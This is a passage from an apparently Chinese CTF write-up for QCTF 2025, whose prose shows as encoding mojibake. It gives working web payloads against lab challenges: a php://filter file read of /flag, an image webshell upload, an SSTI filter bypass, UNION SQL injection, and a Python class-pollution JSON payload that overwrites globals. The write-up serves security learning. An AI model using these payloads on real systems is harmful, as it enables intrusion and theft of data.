</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$imageInfo</span> <span class="o">=</span> <span class="o">@</span><span class="nx">getimagesizefromstring</span><span class="p">(</span><span class="nv">$imageContent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$imageInfo</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// è·å–MIMEç±»å‹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$mimeType</span> <span class="o">=</span> <span class="nv">$imageInfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="c1">// å°†å›¾ç‰‡å†…å®¹è½¬æ¢ä¸ºbase64ç¼–ç 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$base64Image</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$imageContent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;æ— æ³•è¯†åˆ«çš„å›¾ç‰‡æ ¼å¼ ä½ çš„å›¾ç‰‡:&#39;</span><span class="o">.</span><span class="nv">$imageUrl</span><span class="o">.</span><span class="s2">&#34;:&#34;</span><span class="o">.</span><span class="nv">$imageContent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;æ— æ³•è·å–å›¾ç‰‡å†…å®¹ï¼Œè¯·æ£€æŸ¥URLæ˜¯å¦æ­£ç¡® &#39;</span><span class="o">.</span><span class="nv">$imageUrl</span><span class="o">.</span><span class="s2">&#34;:&#34;</span><span class="o">.</span><span class="nv">$imageContent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;æ— æ•ˆçš„URLæ ¼å¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“çš„æ—¶å€™ä¸€ç›´è§‰å¾—æ˜¯ssrfï¼Œä½†æ˜¯ssrfåˆè¯»ä¸åˆ°ä»€ä¹ˆä¸œè¥¿ã€‚åŸæ¥å…³é”®ç‚¹æ˜¯<code>file_get_contents</code>è¿™tmå°±æ˜¯ä¸ªæ–‡ä»¶åŒ…å«å•Šï¼</p>
<p>æ–‡ä»¶åŒ…å«ä¸€ç›´ä¸å¤ªè¡Œï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—æ‰¾æ—¶é—´ç»ƒç»ƒã€‚</p>
<p>è¿™é‡Œå¯ä»¥ç”¨phpä¼ªåè®®ï¼Œ<code>php://filter</code>ä½†æ˜¯å¸¸ç”¨çš„base64ã€rot13å•¥çš„éƒ½è¢«banäº†ã€‚</p>
<p>è¿™é‡Œå°±å¯ä»¥ç”¨UTFç¼–ç ç»•è¿‡äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/convert.iconv.UTF-8.UTF-7/resource=/flag
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251107091426857.png"
	width="1084"
	height="587"
	srcset="/p/qctf2025/image-20251107091426857_hu5789238621705966247.png 480w, /p/qctf2025/image-20251107091426857_hu10223673124004451823.png 1024w"
	loading="lazy"
	
		alt="image-20251107091426857"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<p>å¥½åƒä¹Ÿä¸éœ€è¦è§£ç ï¼Œç›´æ¥æ˜¯å¯¹çš„ï¼Œä¸è¿‡çœŸè¦å†™çš„è¯è¿˜æ˜¯å»ºè®®ç”¨UTF-16ï¼Œè¿™æ ·ä¹Ÿå¥½æ‰¾è½¬æ¢å·¥å…·</p>
<h3 id="only-picture-up">Only Picture Up
</h3><h4 id="çŸ¥è¯†ç‚¹æ–‡ä»¶ä¸Šä¼ ">çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ 
</h4><p>ç›´æ¥ä¼ å›¾ç‰‡é©¬ï¼Œè¿™é¶åœºé‡Œé¢ç›´æ¥æœ‰é…ç½®æ–‡ä»¶å¯ä»¥å°†pngå½“ä½œphpè¿è¡Œï¼Œç›´æ¥æ‰“äº†ã€‚</p>
<p><img src="/p/qctf2025/image-20251107092909245.png"
	width="733"
	height="635"
	srcset="/p/qctf2025/image-20251107092909245_hu11189299856817580986.png 480w, /p/qctf2025/image-20251107092909245_hu9776389144085323957.png 1024w"
	loading="lazy"
	
		alt="image-20251107092909245"
	
	
		class="gallery-image" 
		data-flex-grow="115"
		data-flex-basis="277px"
	
></p>
<h3 id="ç•™è¨€æ¿">ç•™è¨€æ¿
</h3><h4 id="çŸ¥è¯†ç‚¹è¿‡æ»¤ssti-request">çŸ¥è¯†ç‚¹ï¼šè¿‡æ»¤ssti request
</h4><p>è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œå‘ç°requestæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™é‡Œç›´æ¥ç”¨requsetï¼Œè¿™é‡Œæ˜¯ä»cookieè·å–xå’Œy</p>
<p><img src="/p/qctf2025/image-20251107100047642.png"
	width="1668"
	height="575"
	srcset="/p/qctf2025/image-20251107100047642_hu6413203086390227049.png 480w, /p/qctf2025/image-20251107100047642_hu8036503971430584587.png 1024w"
	loading="lazy"
	
		alt="image-20251107100047642"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="696px"
	
></p>
<h3 id="ç™»å½•å’ŒæŸ¥è¯¢">ç™»å½•å’ŒæŸ¥è¯¢
</h3><h4 id="çŸ¥è¯†ç‚¹çˆ†ç ´å’Œå¥‡å¥‡æ€ªæ€ªçš„sql">çŸ¥è¯†ç‚¹ï¼šçˆ†ç ´å’Œå¥‡å¥‡æ€ªæ€ªçš„sql
</h4><p><img src="/p/qctf2025/image-20251107100752631.png"
	width="741"
	height="265"
	srcset="/p/qctf2025/image-20251107100752631_hu5920084097056028220.png 480w, /p/qctf2025/image-20251107100752631_hu12470877157126938856.png 1024w"
	loading="lazy"
	
		alt="image-20251107100752631"
	
	
		class="gallery-image" 
		data-flex-grow="279"
		data-flex-basis="671px"
	
></p>
<p>ä¸‹é¢è¿˜æœ‰ä¸ªç½‘ç›˜ï¼Œç»™äº†å­—å…¸ï¼Œä¸çœ‹ä¹Ÿè¡Œåæ­£çˆ†ç ´å‡ºæ¥admin123</p>
<p><img src="/p/qctf2025/image-20251107101132965.png"
	width="1011"
	height="687"
	srcset="/p/qctf2025/image-20251107101132965_hu14888459901963065064.png 480w, /p/qctf2025/image-20251107101132965_hu10337495310164008255.png 1024w"
	loading="lazy"
	
		alt="image-20251107101132965"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="353px"
	
></p>
<p>ç„¶åé‡å®šå‘åˆ°flag.phpï¼Œç›´æ¥ç»™äº†ä¸ªæŸ¥è¯¢ç»“æœï¼Œè¿ä¸ªæ³¨å…¥ç‚¹éƒ½æ²¡æœ‰wok</p>
<p>åé¢çœ‹wpæ‰çŸ¥é“æ³¨å…¥ç‚¹æ˜¯idã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; order by 4--+
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251107103157721.png"
	width="1164"
	height="573"
	srcset="/p/qctf2025/image-20251107103157721_hu16465972624069936923.png 480w, /p/qctf2025/image-20251107103157721_hu7048270571690662193.png 1024w"
	loading="lazy"
	
		alt="image-20251107103157721"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="487px"
	
></p>
<p>å­—æ®µæ•°ä¸º3ï¼Œç„¶åé¢˜ç›®æœ‰æç¤ºè¯´flagåœ¨flagsè¡¨é‡Œï¼Œç›´æ¥è¯•å‡ºæ¥äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; union select flag,null,null from flags where id=2--%20
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="è¿™æ˜¯ä»€ä¹ˆå‡½æ•°">è¿™æ˜¯ä»€ä¹ˆå‡½æ•°?
</h3><h4 id="çŸ¥è¯†ç‚¹åŸå‹é“¾æ±¡æŸ“">çŸ¥è¯†ç‚¹ï¼šåŸå‹é“¾æ±¡æŸ“
</h4><p>é¦–å…ˆæ˜¯åªèƒ½ä¼ jsonæ•°æ®çš„ï¼Œå‘ç»™polluteè¿™ä¸ªè·¯ç”±ï¼Œä¸å‡ºæ„å¤–å°±æ˜¯åŸå‹é“¾æ±¡æŸ“äº†</p>
<p><img src="/p/qctf2025/image-20251107104611399.png"
	width="590"
	height="267"
	srcset="/p/qctf2025/image-20251107104611399_hu16553834706524795396.png 480w, /p/qctf2025/image-20251107104611399_hu2782589555057404464.png 1024w"
	loading="lazy"
	
		alt="image-20251107104611399"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="530px"
	
></p>
<p>æœ‰æç¤ºè¯´flagåœ¨/flag</p>
<p><img src="/p/qctf2025/image-20251107104931398.png"
	width="630"
	height="166"
	srcset="/p/qctf2025/image-20251107104931398_hu17663918139118315149.png 480w, /p/qctf2025/image-20251107104931398_hu361551735874809772.png 1024w"
	loading="lazy"
	
		alt="image-20251107104931398"
	
	
		class="gallery-image" 
		data-flex-grow="379"
		data-flex-basis="910px"
	
></p>
<p>æ‰«ç›˜å¯ä»¥æ‰«å‡ºæºç ï¼Œå®¡è®¡ä¸€ä¸‹</p>
<p><img src="/p/qctf2025/image-20251107105218535.png"
	width="935"
	height="627"
	srcset="/p/qctf2025/image-20251107105218535_hu9075479108455222701.png 480w, /p/qctf2025/image-20251107105218535_hu17813114884182363087.png 1024w"
	loading="lazy"
	
		alt="image-20251107105218535"
	
	
		class="gallery-image" 
		data-flex-grow="149"
		data-flex-basis="357px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_json</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">=</span> <span class="s2">&#34;where is the flag?&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">dog</span> <span class="o">=</span> <span class="s2">&#34;how to get the flag?&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">cat</span> <span class="o">==</span> <span class="n">dog</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">flag</span> 
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">cat</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">dog</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/src&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/pollute&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Pollution</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">is_json</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span><span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;success&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•å®¡è®¡ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨/flagä¸­å°†catå’Œdogçš„å€¼ç›¸ç­‰</p>
<p>å¦‚ä½•åšåˆ°å‘¢ï¼Ÿ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;__init__&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;__globals__&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;cat&#34;</span><span class="p">:</span> <span class="s2">&#34;same_value&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;dog&#34;</span><span class="p">:</span> <span class="s2">&#34;same_value&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//classå¯ä»¥æœ‰å¯æ— 
</span></span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li><strong><code>__init__</code></strong>ï¼šè¿™æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œå½“æˆ‘ä»¬è®¿é—® <code>instance.__init__</code> æ—¶ï¼Œå®é™…ä¸Šè®¿é—®çš„æ˜¯ <code>cls.__init__</code> æ–¹æ³•ã€‚</li>
<li><strong><code>__globals__</code></strong>ï¼šPython å‡½æ•°çš„ <code>__globals__</code> å±æ€§æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«å‡½æ•°å®šä¹‰æ—¶æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é€šè¿‡ä¿®æ”¹ <code>__init__</code> æ–¹æ³•çš„ <code>__globals__</code>ï¼Œæˆ‘ä»¬å¯ä»¥å½±å“åŒ…å« <code>cat</code> å’Œ <code>dog</code> å…¨å±€å˜é‡çš„æ¨¡å—å‘½åç©ºé—´ã€‚</li>
<li><strong>è®¾ç½®ç›¸åŒå€¼</strong>ï¼šæˆ‘ä»¬å°† <code>__globals__</code> ä¸­çš„ <code>cat</code> å’Œ <code>dog</code> éƒ½è®¾ç½®ä¸ºç›¸åŒçš„å€¼ï¼ˆå¦‚ <code>&quot;same_value&quot;</code>ï¼‰ï¼Œè¿™æ ·åœ¨ <code>/flag</code> è·¯ç”±ä¸­æ¯”è¾ƒæ—¶ï¼Œå®ƒä»¬å°±ä¼šç›¸ç­‰ã€‚</li>
</ol>
<p>mergeå‡½æ•°å¤„ç†é€»è¾‘</p>
<ol>
<li><code>merge</code> å‡½æ•°å¤„ç† JSON æ•°æ®æ—¶ï¼Œä¼šé€’å½’è®¾ç½®å±æ€§ã€‚</li>
<li>å½“é‡åˆ° <code>__init__</code> é”®æ—¶ï¼Œå®ƒä¼šè®¾ç½® <code>instance.__init__</code> å±æ€§ï¼Œä½†ç”±äº <code>instance</code> å·²ç»æœ‰ <code>__init__</code> æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ <code>hasattr(dst, k) and type(v) == dict</code> åˆ†æ”¯ã€‚</li>
<li>ç„¶åé€’å½’è°ƒç”¨ <code>merge(v, getattr(dst, k))</code>ï¼Œå³ <code>merge({&quot;__globals__&quot;: {...}}, instance.__init__)</code>ã€‚</li>
<li>æ¥ä¸‹æ¥å¤„ç† <code>__globals__</code> é”®ï¼Œå®ƒä¼šè®¿é—® <code>instance.__init__.__globals__</code>ï¼Œè¿™æ˜¯åŒ…å«æ¨¡å—å…¨å±€å˜é‡çš„å­—å…¸ã€‚</li>
<li>æœ€åï¼Œ<code>merge</code> å‡½æ•°ä¼šè®¾ç½® <code>__globals__</code> å­—å…¸ä¸­çš„ <code>cat</code> å’Œ <code>dog</code> é”®ä¸ºç›¸åŒçš„å€¼ã€‚</li>
<li>å½“è®¿é—® <code>/flag</code> è·¯ç”±æ—¶ï¼Œå…¨å±€å˜é‡ <code>cat</code> å’Œ <code>dog</code> å·²ç»ç›¸ç­‰ï¼Œå› æ­¤è¿”å› flagã€‚</li>
</ol>
<p><img src="/p/qctf2025/image-20251107111858396.png"
	width="2036"
	height="895"
	srcset="/p/qctf2025/image-20251107111858396_hu4619935167301508826.png 480w, /p/qctf2025/image-20251107111858396_hu763608322929571212.png 1024w"
	loading="lazy"
	
		alt="image-20251107111858396"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<h3 id="regular-expression">Regular Expression
</h3><p>çŸ¥è¯†ç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;?&#34;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_ï¼Ÿ</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;?&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^-(ctf|CTF)&lt;\n&gt;{5}[h-l]\d\d\W+@email\.com flag.\b$/&#39;</span><span class="p">,</span> <span class="nv">$_ï¼Ÿ</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_ï¼Ÿ</span><span class="p">)</span> <span class="o">==</span> <span class="mi">40</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Good job! Now I need you to write a regular expression for my string.&lt;/br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;preg&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$preg</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;|&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;preg&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$test_string</span> <span class="o">=</span> <span class="s1">&#39;Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0&#39;</span><span class="p">;</span>
